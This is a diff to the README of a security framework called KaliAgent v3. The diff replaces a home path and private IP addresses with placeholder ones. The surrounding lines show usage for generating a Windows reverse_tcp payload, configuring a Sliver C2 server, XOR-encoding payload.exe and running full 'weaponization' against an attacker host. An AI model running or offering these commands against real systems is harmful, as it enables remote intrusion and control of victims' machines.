@@ -26,7 +26,7 @@ KaliAgent v3 is a comprehensive security automation framework that integrates na
 
 ```bash
 # Clone repository
-cd /home/wez/stsgym-work/agentic_ai
+cd /home/user/agentic-ai/agentic_ai
 
 # Run setup
 python3 setup.py install
@@ -152,7 +152,7 @@ engine = WeaponizationEngine()
 # Quick weaponization
 report = engine.quick_weaponize(
     name='reverse_tcp',
-    lhost='192.168.1.100',
+    lhost='192.0.2.100',
     lport=4444,
     platform=Platform.WINDOWS
 )
@@ -174,7 +174,7 @@ sliver = C2Server(
     id='sliver_1',
     name='Primary Sliver',
     framework=C2FrameworkType.SLIVER,
-    host='192.168.1.100',
+    host='192.0.2.100',
     port=31337,
     status='online'
 )
@@ -257,7 +257,7 @@ python3 -m kali_agent_v3.core.authorization --authorize sql_injection --pin 1234
 
 ```bash
 # Payload generation
-python3 -m kali_agent_v3.weaponization.payload_generator --lhost 192.168.1.100 --lport 4444
+python3 -m kali_agent_v3.weaponization.payload_generator --lhost 192.0.2.100 --lport 4444
 
 # Encoding
 python3 -m kali_agent_v3.weaponization.encoder --encode payload.exe --encoder xor_dynamic
@@ -266,7 +266,7 @@ python3 -m kali_agent_v3.weaponization.encoder --encode payload.exe --encoder xo
 python3 -m kali_agent_v3.weaponization.testing_framework --test payload.exe
 
 # Full weaponization
-python3 -m kali_agent_v3.weaponization.weaponization_engine --quick --lhost 192.168.1.100
+python3 -m kali_agent_v3.weaponization.weaponization_engine --quick --lhost 192.0.2.100
 ```
 
 ### C2 Infrastructure
